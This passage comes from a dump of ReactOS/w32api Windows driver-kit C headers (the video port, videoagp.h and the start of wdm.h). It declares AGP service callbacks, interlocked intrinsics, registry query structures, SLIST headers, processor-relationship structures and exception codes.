  IN UCHAR RevisionId,
  IN USHORT SubVendorId,
  IN USHORT SubSystemId,
  IN ULONG Flags);

VPAPI
ULONG
NTAPI
VideoPortGetAssociatedDeviceID(
  IN PVOID DeviceObject);

VPAPI
VP_STATUS
NTAPI
VideoPortFlushRegistry(
  PVOID HwDeviceExtension);

VPAPI
VP_STATUS
NTAPI
VideoPortGetVersion(
  IN PVOID HwDeviceExtension,
  IN OUT PVPOSVERSIONINFO pVpOsVersionInfo);

VPAPI
BOOLEAN
NTAPI
VideoPortIsNoVesa(VOID);

VPAPI
VP_STATUS
NTAPI
VideoPortRegisterBugcheckCallback(
  IN PVOID HwDeviceExtension,
  IN ULONG BugcheckCode,
  IN PVIDEO_BUGCHECK_CALLBACK Callback,
  IN ULONG BugcheckDataSize);

VPAPI
PVIDEO_DEBUG_REPORT
NTAPI
VideoPortDbgReportCreate(
  IN PVOID HwDeviceExtension,
  IN ULONG ulCode,
  IN ULONG_PTR ulpArg1,
  IN ULONG_PTR ulpArg2,
  IN ULONG_PTR ulpArg3,
  IN ULONG_PTR ulpArg4);

VPAPI
BOOLEAN
NTAPI
VideoPortDbgReportSecondaryData(
  IN OUT PVIDEO_DEBUG_REPORT pReport,
  IN PVOID pvData,
  IN ULONG ulDataSize);

VPAPI
VOID
NTAPI
VideoPortDbgReportComplete(
  IN OUT PVIDEO_DEBUG_REPORT pReport);

#ifdef __cplusplus
}
#endif

```

`include/ddk/videoagp.h`:

```h
/*
 * videoagp.h
 *
 * Video miniport AGP interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define __VIDEOAGP_H__

#ifdef __cplusplus
extern "C" {
#endif

#define VIDEO_AGP_RATE_1X                 0x00000001
#define VIDEO_AGP_RATE_2X                 0x00000002
#define VIDEO_AGP_RATE_4X                 0x00000004
#define VIDEO_AGP_RATE_8X                 0x00000008

typedef enum _VIDEO_PORT_CACHE_TYPE {
  VpNonCached = 0,
  VpWriteCombined,
  VpCached
} VIDEO_PORT_CACHE_TYPE;

typedef BOOLEAN
(NTAPI *PAGP_COMMIT_PHYSICAL)(
  IN PVOID HwDeviceExtension,
  IN PVOID PhysicalReserveContext,
  IN ULONG Pages,
  IN ULONG Offset);

typedef PVOID
(NTAPI *PAGP_COMMIT_VIRTUAL)(
  IN PVOID HwDeviceExtension,
  IN PVOID VirtualReserveContext,
  IN ULONG Pages,
  IN ULONG Offset);

typedef VOID
(NTAPI *PAGP_FREE_PHYSICAL)(
  IN PVOID HwDeviceExtension,
  IN PVOID PhysicalReserveContext,
  IN ULONG Pages,
  IN ULONG Offset);

typedef VOID
(NTAPI *PAGP_FREE_VIRTUAL)(
  IN PVOID HwDeviceExtension,
  IN PVOID VirtualReserveContext,
  IN ULONG Pages,
  IN ULONG Offset);

typedef VOID
(NTAPI *PAGP_RELEASE_PHYSICAL)(
  IN PVOID HwDeviceExtension,
  IN PVOID PhysicalReserveContext);

typedef VOID
(NTAPI *PAGP_RELEASE_VIRTUAL)(
  IN PVOID HwDeviceExtension,
  IN PVOID VirtualReserveContext);

typedef PHYSICAL_ADDRESS
(NTAPI *PAGP_RESERVE_PHYSICAL)(
  IN PVOID HwDeviceExtension,
  IN ULONG Pages,
  IN VIDEO_PORT_CACHE_TYPE  Caching,
  OUT PVOID *PhysicalReserveContext);

typedef PVOID
(NTAPI *PAGP_RESERVE_VIRTUAL)(
  IN PVOID HwDeviceExtension,
  IN HANDLE ProcessHandle,
  IN PVOID PhysicalReserveContext,
  OUT PVOID *VirtualReserveContext);

typedef BOOLEAN
(NTAPI *PAGP_SET_RATE)(
  IN PVOID HwDeviceExtension,
  IN ULONG AgpRate);

typedef struct _VIDEO_PORT_AGP_SERVICES {
  PAGP_RESERVE_PHYSICAL AgpReservePhysical;
  PAGP_RELEASE_PHYSICAL AgpReleasePhysical;
  PAGP_COMMIT_PHYSICAL AgpCommitPhysical;
  PAGP_FREE_PHYSICAL AgpFreePhysical;
  PAGP_RESERVE_VIRTUAL AgpReserveVirtual;
  PAGP_RELEASE_VIRTUAL AgpReleaseVirtual;
  PAGP_COMMIT_VIRTUAL AgpCommitVirtual;
  PAGP_FREE_VIRTUAL AgpFreeVirtual;
  ULONGLONG AllocationLimit;
} VIDEO_PORT_AGP_SERVICES, *PVIDEO_PORT_AGP_SERVICES;

BOOLEAN
NTAPI
VideoPortGetAgpServices(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_PORT_AGP_SERVICES AgpServices);

#ifdef __cplusplus
}
#endif

```

`include/ddk/wdm.h`:

```h
/*
 * wdm.h
 *
 * Windows NT WDM Driver Developer Kit
 *
 * This file is part of the ReactOS DDK package.
 *
 * Contributors:
 *   Amine Khaldi
 *   Timo Kreuzer (timo.kreuzer@reactos.org)
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */
#pragma once

#ifndef _WDMDDK_
#define _WDMDDK_

#define WDM_MAJORVERSION        0x06
#define WDM_MINORVERSION        0x00

/* Included via ntddk.h? */
#ifndef _NTDDK_
#define _NTDDK_
#define _WDM_INCLUDED_
#define _DDK_DRIVER_
#define NO_INTERLOCKED_INTRINSICS
#endif /* _NTDDK_ */

/* Dependencies */
#define NT_INCLUDED
#include <excpt.h>
#include <ntdef.h>
#include <ntstatus.h>
#include <ntiologc.h>

#ifndef GUID_DEFINED
#include <guiddef.h>
#endif

#ifdef _MAC
#ifndef _INC_STRING
#include <string.h>
#endif /* _INC_STRING */
#else
#include <string.h>
#endif /* _MAC */

#ifndef _KTMTYPES_
typedef GUID UOW, *PUOW;
#endif

typedef GUID *PGUID;

#if (NTDDI_VERSION >= NTDDI_WINXP)
#include <dpfilter.h>
#endif

#include "intrin.h"

#ifdef __cplusplus
extern "C" {
#endif

#if !defined(_NTHALDLL_) && !defined(_BLDR_)
#define NTHALAPI DECLSPEC_IMPORT
#else
#define NTHALAPI
#endif

/* For ReactOS */
#if !defined(_NTOSKRNL_) && !defined(_BLDR_)
#define NTKERNELAPI DECLSPEC_IMPORT
#else
#define NTKERNELAPI
#endif

#if defined(_X86_) && !defined(_NTHAL_)
#define _DECL_HAL_KE_IMPORT  DECLSPEC_IMPORT
#elif defined(_X86_)
#define _DECL_HAL_KE_IMPORT
#else
#define _DECL_HAL_KE_IMPORT NTKERNELAPI
#endif

#if defined(_WIN64)
#define POINTER_ALIGNMENT DECLSPEC_ALIGN(8)
#else
#define POINTER_ALIGNMENT
#endif

#if defined(_MSC_VER)
/* Disable some warnings */
#pragma warning(disable:4115) /* Named type definition in parentheses */
#pragma warning(disable:4201) /* Nameless unions and structs */
#pragma warning(disable:4214) /* Bit fields of other types than int */
#pragma warning(disable:4820) /* Padding added, due to alignemnet requirement */

/* Indicate if #pragma alloc_text() is supported */
#if defined(_M_IX86) || defined(_M_AMD64) || defined(_M_IA64)
#define ALLOC_PRAGMA 1
#endif

/* Indicate if #pragma data_seg() is supported */
#if defined(_M_IX86) || defined(_M_AMD64)
#define ALLOC_DATA_PRAGMA 1
#endif

#endif /* _MSC_VER */

#if defined(_WIN64)
#if !defined(USE_DMA_MACROS) && !defined(_NTHAL_)
#define USE_DMA_MACROS
#endif
#if !defined(NO_LEGACY_DRIVERS) && !defined(__REACTOS__)
#define NO_LEGACY_DRIVERS
#endif
#endif /* defined(_WIN64) */

/* Forward declarations */
struct _IRP;
struct _MDL;
struct _KAPC;
struct _KDPC;
struct _FILE_OBJECT;
struct _DMA_ADAPTER;
struct _DEVICE_OBJECT;
struct _DRIVER_OBJECT;
struct _IO_STATUS_BLOCK;
struct _DEVICE_DESCRIPTION;
struct _SCATTER_GATHER_LIST;
struct _DRIVE_LAYOUT_INFORMATION;
struct _COMPRESSED_DATA_INFO;
struct _IO_RESOURCE_DESCRIPTOR;

/* Structures not exposed to drivers */
typedef struct _OBJECT_TYPE *POBJECT_TYPE;
typedef struct _HAL_DISPATCH_TABLE *PHAL_DISPATCH_TABLE;
typedef struct _HAL_PRIVATE_DISPATCH_TABLE *PHAL_PRIVATE_DISPATCH_TABLE;
typedef struct _CALLBACK_OBJECT *PCALLBACK_OBJECT;
typedef struct _EPROCESS *PEPROCESS;
typedef struct _ETHREAD *PETHREAD;
typedef struct _IO_TIMER *PIO_TIMER;
typedef struct _KINTERRUPT *PKINTERRUPT;
typedef struct _KPROCESS *PKPROCESS;
typedef struct _KTHREAD *PKTHREAD, *PRKTHREAD;
typedef struct _CONTEXT *PCONTEXT;

#if defined(USE_DMA_MACROS) && !defined(_NTHAL_)
typedef struct _DMA_ADAPTER *PADAPTER_OBJECT;
#elif defined(_WDM_INCLUDED_)
typedef struct _DMA_ADAPTER *PADAPTER_OBJECT;
#else
typedef struct _ADAPTER_OBJECT *PADAPTER_OBJECT; 
#endif

#ifndef DEFINE_GUIDEX
#ifdef _MSC_VER
#define DEFINE_GUIDEX(name) EXTERN_C const CDECL GUID name
#else
#define DEFINE_GUIDEX(name) EXTERN_C const GUID name
#endif
#endif /* DEFINE_GUIDEX */

#ifndef STATICGUIDOF
#define STATICGUIDOF(guid) STATIC_##guid
#endif

/* GUID Comparison */
#ifndef __IID_ALIGNED__
#define __IID_ALIGNED__
#ifdef __cplusplus
inline int IsEqualGUIDAligned(REFGUID guid1, REFGUID guid2)
{
    return ( (*(PLONGLONG)(&guid1) == *(PLONGLONG)(&guid2)) && 
             (*((PLONGLONG)(&guid1) + 1) == *((PLONGLONG)(&guid2) + 1)) );
}
#else
#define IsEqualGUIDAligned(guid1, guid2) \
           ( (*(PLONGLONG)(guid1) == *(PLONGLONG)(guid2)) && \
             (*((PLONGLONG)(guid1) + 1) == *((PLONGLONG)(guid2) + 1)) )
#endif /* __cplusplus */
#endif /* !__IID_ALIGNED__ */


/******************************************************************************
 *                           INTERLOCKED Functions                            *
 ******************************************************************************/
//
// Intrinsics (note: taken from our winnt.h)
// FIXME: 64-bit
//
#if defined(__GNUC__)

static __inline__ BOOLEAN
InterlockedBitTestAndSet(
  IN LONG volatile *Base,
  IN LONG Bit)
{
#if defined(_M_IX86)
  LONG OldBit;
  __asm__ __volatile__("lock "
                       "btsl %2,%1\n\t"
                       "sbbl %0,%0\n\t"
                       :"=r" (OldBit),"+m" (*Base)
                       :"Ir" (Bit)
                       : "memory");
  return OldBit;
#else
  return (_InterlockedOr(Base, 1 << Bit) >> Bit) & 1;
#endif
}

static __inline__ BOOLEAN
InterlockedBitTestAndReset(
  IN LONG volatile *Base,
  IN LONG Bit)
{
#if defined(_M_IX86)
  LONG OldBit;
  __asm__ __volatile__("lock "
                       "btrl %2,%1\n\t"
                       "sbbl %0,%0\n\t"
                       :"=r" (OldBit),"+m" (*Base)
                       :"Ir" (Bit)
                       : "memory");
  return OldBit;
#else
  return (_InterlockedAnd(Base, ~(1 << Bit)) >> Bit) & 1;
#endif
}

#endif /* defined(__GNUC__) */

#define BitScanForward _BitScanForward
#define BitScanReverse _BitScanReverse
#define BitTest _bittest
#define BitTestAndComplement _bittestandcomplement
#define BitTestAndSet _bittestandset
#define BitTestAndReset _bittestandreset
#define InterlockedBitTestAndSet _interlockedbittestandset
#define InterlockedBitTestAndReset _interlockedbittestandreset

#ifdef _M_AMD64
#define BitTest64 _bittest64
#define BitTestAndComplement64 _bittestandcomplement64
#define BitTestAndSet64 _bittestandset64
#define BitTestAndReset64 _bittestandreset64
#define InterlockedBitTestAndSet64 _interlockedbittestandset64
#define InterlockedBitTestAndReset64 _interlockedbittestandreset64
#endif

#if !defined(__INTERLOCKED_DECLARED)
#define __INTERLOCKED_DECLARED

#if defined (_X86_)
#if defined(NO_INTERLOCKED_INTRINSICS)
NTKERNELAPI
LONG
FASTCALL
InterlockedIncrement(
  IN OUT LONG volatile *Addend);

NTKERNELAPI
LONG
FASTCALL
InterlockedDecrement(
  IN OUT LONG volatile *Addend);

NTKERNELAPI
LONG
FASTCALL
InterlockedCompareExchange(
  IN OUT LONG volatile *Destination,
  IN LONG Exchange,
  IN LONG Comparand);

NTKERNELAPI
LONG
FASTCALL
InterlockedExchange(
  IN OUT LONG volatile *Destination,
  IN LONG Value);

NTKERNELAPI
LONG
FASTCALL
InterlockedExchangeAdd(
  IN OUT LONG volatile *Addend,
  IN LONG  Value);

#else /* !defined(NO_INTERLOCKED_INTRINSICS) */

#define InterlockedExchange _InterlockedExchange
#define InterlockedIncrement _InterlockedIncrement
#define InterlockedDecrement _InterlockedDecrement
#define InterlockedExchangeAdd _InterlockedExchangeAdd
#define InterlockedCompareExchange _InterlockedCompareExchange
#define InterlockedOr _InterlockedOr
#define InterlockedAnd _InterlockedAnd
#define InterlockedXor _InterlockedXor

#endif /* !defined(NO_INTERLOCKED_INTRINSICS) */

#endif /* defined (_X86_) */

#if !defined (_WIN64)
/*
 * PVOID
 * InterlockedExchangePointer(
 *   IN OUT PVOID volatile  *Target,
 *   IN PVOID  Value)
 */
#define InterlockedExchangePointer(Target, Value) \
  ((PVOID) InterlockedExchange((PLONG) Target, (LONG) Value))

/*
 * PVOID
 * InterlockedCompareExchangePointer(
 *   IN OUT PVOID  *Destination,
 *   IN PVOID  Exchange,
 *   IN PVOID  Comparand)
 */
#define InterlockedCompareExchangePointer(Destination, Exchange, Comparand) \
  ((PVOID) InterlockedCompareExchange((PLONG) Destination, (LONG) Exchange, (LONG) Comparand))

#define InterlockedExchangeAddSizeT(a, b) InterlockedExchangeAdd((LONG *)a, b)
#define InterlockedIncrementSizeT(a) InterlockedIncrement((LONG *)a)
#define InterlockedDecrementSizeT(a) InterlockedDecrement((LONG *)a)

#endif // !defined (_WIN64)

#if defined (_M_AMD64)

#define InterlockedExchangeAddSizeT(a, b) InterlockedExchangeAdd64((LONGLONG *)a, (LONGLONG)b)
#define InterlockedIncrementSizeT(a) InterlockedIncrement64((LONGLONG *)a)
#define InterlockedDecrementSizeT(a) InterlockedDecrement64((LONGLONG *)a)
#define InterlockedAnd _InterlockedAnd
#define InterlockedOr _InterlockedOr
#define InterlockedXor _InterlockedXor
#define InterlockedIncrement _InterlockedIncrement
#define InterlockedDecrement _InterlockedDecrement
#define InterlockedAdd _InterlockedAdd
#define InterlockedExchange _InterlockedExchange
#define InterlockedExchangeAdd _InterlockedExchangeAdd
#define InterlockedCompareExchange _InterlockedCompareExchange
#define InterlockedAnd64 _InterlockedAnd64
#define InterlockedOr64 _InterlockedOr64
#define InterlockedXor64 _InterlockedXor64
#define InterlockedIncrement64 _InterlockedIncrement64
#define InterlockedDecrement64 _InterlockedDecrement64
#define InterlockedAdd64 _InterlockedAdd64
#define InterlockedExchange64 _InterlockedExchange64
#define InterlockedExchangeAdd64 _InterlockedExchangeAdd64
#define InterlockedCompareExchange64 _InterlockedCompareExchange64
#define InterlockedCompareExchangePointer _InterlockedCompareExchangePointer
#define InterlockedExchangePointer _InterlockedExchangePointer
#define InterlockedBitTestAndSet64 _interlockedbittestandset64
#define InterlockedBitTestAndReset64 _interlockedbittestandreset64

#endif // _M_AMD64

#endif /* !__INTERLOCKED_DECLARED */


/******************************************************************************
 *                           Runtime Library Types                            *
 ******************************************************************************/

#define RTL_REGISTRY_ABSOLUTE             0
#define RTL_REGISTRY_SERVICES             1
#define RTL_REGISTRY_CONTROL              2
#define RTL_REGISTRY_WINDOWS_NT           3
#define RTL_REGISTRY_DEVICEMAP            4
#define RTL_REGISTRY_USER                 5
#define RTL_REGISTRY_MAXIMUM              6
#define RTL_REGISTRY_HANDLE               0x40000000
#define RTL_REGISTRY_OPTIONAL             0x80000000

/* RTL_QUERY_REGISTRY_TABLE.Flags */
#define RTL_QUERY_REGISTRY_SUBKEY         0x00000001
#define RTL_QUERY_REGISTRY_TOPKEY         0x00000002
#define RTL_QUERY_REGISTRY_REQUIRED       0x00000004
#define RTL_QUERY_REGISTRY_NOVALUE        0x00000008
#define RTL_QUERY_REGISTRY_NOEXPAND       0x00000010
#define RTL_QUERY_REGISTRY_DIRECT         0x00000020
#define RTL_QUERY_REGISTRY_DELETE         0x00000040

#define HASH_STRING_ALGORITHM_DEFAULT     0
#define HASH_STRING_ALGORITHM_X65599      1
#define HASH_STRING_ALGORITHM_INVALID     0xffffffff

typedef struct _RTL_BITMAP {
  ULONG SizeOfBitMap;
  PULONG Buffer;
} RTL_BITMAP, *PRTL_BITMAP;

typedef struct _RTL_BITMAP_RUN {
  ULONG StartingIndex;
  ULONG NumberOfBits;
} RTL_BITMAP_RUN, *PRTL_BITMAP_RUN;

typedef NTSTATUS
(NTAPI *PRTL_QUERY_REGISTRY_ROUTINE)(
  IN PWSTR ValueName,
  IN ULONG ValueType,
  IN PVOID ValueData,
  IN ULONG ValueLength,
  IN PVOID Context,
  IN PVOID EntryContext);

typedef struct _RTL_QUERY_REGISTRY_TABLE {
  PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;
  ULONG Flags;
  PCWSTR Name;
  PVOID EntryContext;
  ULONG DefaultType;
  PVOID DefaultData;
  ULONG DefaultLength;
} RTL_QUERY_REGISTRY_TABLE, *PRTL_QUERY_REGISTRY_TABLE;

typedef struct _TIME_FIELDS {
  CSHORT Year;
  CSHORT Month;
  CSHORT Day;
  CSHORT Hour;
  CSHORT Minute;
  CSHORT Second;
  CSHORT Milliseconds;
  CSHORT Weekday;
} TIME_FIELDS, *PTIME_FIELDS;

/* Slist Header */
#ifndef _SLIST_HEADER_
#define _SLIST_HEADER_

#if defined(_WIN64)

typedef struct DECLSPEC_ALIGN(16) _SLIST_ENTRY {
  struct _SLIST_ENTRY *Next;
} SLIST_ENTRY, *PSLIST_ENTRY;

typedef struct _SLIST_ENTRY32 {
  ULONG Next;
} SLIST_ENTRY32, *PSLIST_ENTRY32;

typedef union DECLSPEC_ALIGN(16) _SLIST_HEADER {
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Alignment;
    ULONGLONG Region;
  } DUMMYSTRUCTNAME;
  struct {
    ULONGLONG Depth:16;
    ULONGLONG Sequence:9;
    ULONGLONG NextEntry:39;
    ULONGLONG HeaderType:1;
    ULONGLONG Init:1;
    ULONGLONG Reserved:59;
    ULONGLONG Region:3;
  } Header8;
  struct {
    ULONGLONG Depth:16;
    ULONGLONG Sequence:48;
    ULONGLONG HeaderType:1;
    ULONGLONG Init:1;
    ULONGLONG Reserved:2;
    ULONGLONG NextEntry:60;
  } Header16;
  struct {
    ULONGLONG Depth:16;
    ULONGLONG Sequence:48;
    ULONGLONG HeaderType:1;
    ULONGLONG Reserved:3;
    ULONGLONG NextEntry:60;
  } HeaderX64;
} SLIST_HEADER, *PSLIST_HEADER;

typedef union _SLIST_HEADER32 {
  ULONGLONG Alignment;
  _ANONYMOUS_STRUCT struct {
    SLIST_ENTRY32 Next;
    USHORT Depth;
    USHORT Sequence;
  } DUMMYSTRUCTNAME;
} SLIST_HEADER32, *PSLIST_HEADER32;

#else

#define SLIST_ENTRY SINGLE_LIST_ENTRY
#define _SLIST_ENTRY _SINGLE_LIST_ENTRY
#define PSLIST_ENTRY PSINGLE_LIST_ENTRY

typedef SLIST_ENTRY SLIST_ENTRY32, *PSLIST_ENTRY32;

typedef union _SLIST_HEADER {
  ULONGLONG Alignment;
  _ANONYMOUS_STRUCT struct {
    SLIST_ENTRY Next;
    USHORT Depth;
    USHORT Sequence;
  } DUMMYSTRUCTNAME;
} SLIST_HEADER, *PSLIST_HEADER;

typedef SLIST_HEADER SLIST_HEADER32, *PSLIST_HEADER32;

#endif /* defined(_WIN64) */

#endif /* _SLIST_HEADER_ */

/* MS definition is broken! */
extern BOOLEAN NTSYSAPI NlsMbCodePageTag;
extern BOOLEAN NTSYSAPI NlsMbOemCodePageTag;
#define NLS_MB_CODE_PAGE_TAG NlsMbCodePageTag
#define NLS_MB_OEM_CODE_PAGE_TAG NlsMbOemCodePageTag

#define SHORT_LEAST_SIGNIFICANT_BIT       0
#define SHORT_MOST_SIGNIFICANT_BIT        1

#define LONG_LEAST_SIGNIFICANT_BIT        0
#define LONG_3RD_MOST_SIGNIFICANT_BIT     1
#define LONG_2ND_MOST_SIGNIFICANT_BIT     2
#define LONG_MOST_SIGNIFICANT_BIT         3

#define RTLVERLIB_DDI(x) Wdmlib##x

typedef BOOLEAN
(*PFN_RTL_IS_NTDDI_VERSION_AVAILABLE)(
  IN ULONG Version);

typedef BOOLEAN
(*PFN_RTL_IS_SERVICE_PACK_VERSION_INSTALLED)(
  IN ULONG Version);

/******************************************************************************
 *                              Kernel Types                                  *
 ******************************************************************************/

typedef UCHAR KIRQL, *PKIRQL;
typedef CCHAR KPROCESSOR_MODE;
typedef LONG KPRIORITY;

typedef enum _MODE {
  KernelMode,
  UserMode,
  MaximumMode
} MODE;

#define CACHE_FULLY_ASSOCIATIVE 0xFF
#define MAXIMUM_SUSPEND_COUNT   MAXCHAR

#define EVENT_QUERY_STATE (0x0001)
#define EVENT_MODIFY_STATE (0x0002)
#define EVENT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3)

#define LTP_PC_SMT 0x1

#if (NTDDI_VERSION < NTDDI_WIN7) || defined(_X86_) || !defined(NT_PROCESSOR_GROUPS)
#define SINGLE_GROUP_LEGACY_API        1
#endif

#define SEMAPHORE_QUERY_STATE (0x0001)
#define SEMAPHORE_MODIFY_STATE (0x0002)
#define SEMAPHORE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3)

typedef enum _LOGICAL_PROCESSOR_RELATIONSHIP {
  RelationProcessorCore,
  RelationNumaNode,
  RelationCache,
  RelationProcessorPackage,
  RelationGroup,
  RelationAll = 0xffff
} LOGICAL_PROCESSOR_RELATIONSHIP;

typedef enum _PROCESSOR_CACHE_TYPE {
  CacheUnified,
  CacheInstruction,
  CacheData,
  CacheTrace
} PROCESSOR_CACHE_TYPE;

typedef struct _CACHE_DESCRIPTOR {
  UCHAR Level;
  UCHAR Associativity;
  USHORT LineSize;
  ULONG Size;
  PROCESSOR_CACHE_TYPE Type;
} CACHE_DESCRIPTOR, *PCACHE_DESCRIPTOR;

typedef struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION {
  ULONG_PTR ProcessorMask;
  LOGICAL_PROCESSOR_RELATIONSHIP Relationship;
  _ANONYMOUS_UNION union {
    struct {
      UCHAR Flags;
    } ProcessorCore;
    struct {
      ULONG NodeNumber;
    } NumaNode;
    CACHE_DESCRIPTOR Cache;
    ULONGLONG Reserved[2];
  } DUMMYUNIONNAME;
} SYSTEM_LOGICAL_PROCESSOR_INFORMATION, *PSYSTEM_LOGICAL_PROCESSOR_INFORMATION;

typedef struct _PROCESSOR_RELATIONSHIP {
  UCHAR Flags;
  UCHAR Reserved[21];
  USHORT GroupCount;
  GROUP_AFFINITY GroupMask[ANYSIZE_ARRAY];
} PROCESSOR_RELATIONSHIP, *PPROCESSOR_RELATIONSHIP;

typedef struct _NUMA_NODE_RELATIONSHIP {
  ULONG NodeNumber;
  UCHAR Reserved[20];
  GROUP_AFFINITY GroupMask;
} NUMA_NODE_RELATIONSHIP, *PNUMA_NODE_RELATIONSHIP;

typedef struct _CACHE_RELATIONSHIP {
  UCHAR Level;
  UCHAR Associativity;
  USHORT LineSize;
  ULONG CacheSize;
  PROCESSOR_CACHE_TYPE Type;
  UCHAR Reserved[20];
  GROUP_AFFINITY GroupMask;
} CACHE_RELATIONSHIP, *PCACHE_RELATIONSHIP;

typedef struct _PROCESSOR_GROUP_INFO {
  UCHAR MaximumProcessorCount;
  UCHAR ActiveProcessorCount;
  UCHAR Reserved[38];
  KAFFINITY ActiveProcessorMask;
} PROCESSOR_GROUP_INFO, *PPROCESSOR_GROUP_INFO;

typedef struct _GROUP_RELATIONSHIP {
  USHORT MaximumGroupCount;
  USHORT ActiveGroupCount;
  UCHAR Reserved[20];
  PROCESSOR_GROUP_INFO GroupInfo[ANYSIZE_ARRAY];
} GROUP_RELATIONSHIP, *PGROUP_RELATIONSHIP;

typedef struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX {
  LOGICAL_PROCESSOR_RELATIONSHIP Relationship;
  ULONG Size;
  _ANONYMOUS_UNION union {
    PROCESSOR_RELATIONSHIP Processor;
    NUMA_NODE_RELATIONSHIP NumaNode;
    CACHE_RELATIONSHIP Cache;
    GROUP_RELATIONSHIP Group;
  } DUMMYUNIONNAME;
} SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, *PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX;

/* Processor features */
#define PF_FLOATING_POINT_PRECISION_ERRATA  0
#define PF_FLOATING_POINT_EMULATED          1
#define PF_COMPARE_EXCHANGE_DOUBLE          2
#define PF_MMX_INSTRUCTIONS_AVAILABLE       3
#define PF_PPC_MOVEMEM_64BIT_OK             4
#define PF_ALPHA_BYTE_INSTRUCTIONS          5
#define PF_XMMI_INSTRUCTIONS_AVAILABLE      6
#define PF_3DNOW_INSTRUCTIONS_AVAILABLE     7
#define PF_RDTSC_INSTRUCTION_AVAILABLE      8
#define PF_PAE_ENABLED                      9
#define PF_XMMI64_INSTRUCTIONS_AVAILABLE   10
#define PF_SSE_DAZ_MODE_AVAILABLE          11
#define PF_NX_ENABLED                      12
#define PF_SSE3_INSTRUCTIONS_AVAILABLE     13
#define PF_COMPARE_EXCHANGE128             14
#define PF_COMPARE64_EXCHANGE128           15
#define PF_CHANNELS_ENABLED                16
#define PF_XSAVE_ENABLED                   17

#define MAXIMUM_WAIT_OBJECTS              64

#define ASSERT_APC(Object) NT_ASSERT((Object)->Type == ApcObject)

#define ASSERT_DPC(Object) \
    ASSERT(((Object)->Type == 0) || \
           ((Object)->Type == DpcObject) || \
           ((Object)->Type == ThreadedDpcObject))

#define ASSERT_GATE(object) \
    NT_ASSERT((((object)->Header.Type & KOBJECT_TYPE_MASK) == GateObject) || \
              (((object)->Header.Type & KOBJECT_TYPE_MASK) == EventSynchronizationObject))

#define ASSERT_DEVICE_QUEUE(Object) \
    NT_ASSERT((Object)->Type == DeviceQueueObject)

#define ASSERT_TIMER(E) \
    NT_ASSERT(((E)->Header.Type == TimerNotificationObject) || \
              ((E)->Header.Type == TimerSynchronizationObject))

#define ASSERT_MUTANT(E) \
    NT_ASSERT((E)->Header.Type == MutantObject)

#define ASSERT_SEMAPHORE(E) \
    NT_ASSERT((E)->Header.Type == SemaphoreObject)

#define ASSERT_EVENT(E) \
    NT_ASSERT(((E)->Header.Type == NotificationEvent) || \
              ((E)->Header.Type == SynchronizationEvent))

#define DPC_NORMAL 0
#define DPC_THREADED 1

#define GM_LOCK_BIT          0x1
#define GM_LOCK_BIT_V        0x0
#define GM_LOCK_WAITER_WOKEN 0x2
#define GM_LOCK_WAITER_INC   0x4

#define LOCK_QUEUE_WAIT_BIT               0
#define LOCK_QUEUE_OWNER_BIT              1

#define LOCK_QUEUE_WAIT                   1
#define LOCK_QUEUE_OWNER                  2
#define LOCK_QUEUE_TIMER_LOCK_SHIFT       4
#define LOCK_QUEUE_TIMER_TABLE_LOCKS (1 << (8 - LOCK_QUEUE_TIMER_LOCK_SHIFT))

#define PROCESSOR_FEATURE_MAX 64

#define DBG_STATUS_CONTROL_C              1
#define DBG_STATUS_SYSRQ                  2
#define DBG_STATUS_BUGCHECK_FIRST         3
#define DBG_STATUS_BUGCHECK_SECOND        4
#define DBG_STATUS_FATAL                  5
#define DBG_STATUS_DEBUG_CONTROL          6
#define DBG_STATUS_WORKER                 7

#if defined(_WIN64)
#define MAXIMUM_PROC_PER_GROUP 64
#else
#define MAXIMUM_PROC_PER_GROUP 32
#endif
#define MAXIMUM_PROCESSORS          MAXIMUM_PROC_PER_GROUP

/* Exception Records */
#define EXCEPTION_NONCONTINUABLE     1
#define EXCEPTION_MAXIMUM_PARAMETERS 15

#define EXCEPTION_DIVIDED_BY_ZERO       0
#define EXCEPTION_DEBUG                 1
#define EXCEPTION_NMI                   2
#define EXCEPTION_INT3                  3
#define EXCEPTION_BOUND_CHECK           5
#define EXCEPTION_INVALID_OPCODE        6
#define EXCEPTION_NPX_NOT_AVAILABLE     7
#define EXCEPTION_DOUBLE_FAULT          8
#define EXCEPTION_NPX_OVERRUN           9
#define EXCEPTION_INVALID_TSS           0x0A
#define EXCEPTION_SEGMENT_NOT_PRESENT   0x0B
#define EXCEPTION_STACK_FAULT           0x0C
#define EXCEPTION_GP_FAULT              0x0D
#define EXCEPTION_RESERVED_TRAP         0x0F
#define EXCEPTION_NPX_ERROR             0x010
#define EXCEPTION_ALIGNMENT_CHECK       0x011

typedef struct _EXCEPTION_RECORD {
  NTSTATUS ExceptionCode;
  ULONG ExceptionFlags;
  struct _EXCEPTION_RECORD *ExceptionRecord;
  PVOID ExceptionAddress;
  ULONG NumberParameters;
  ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD, *PEXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD32 {
  NTSTATUS ExceptionCode;
  ULONG ExceptionFlags;
  ULONG ExceptionRecord;
  ULONG ExceptionAddress;
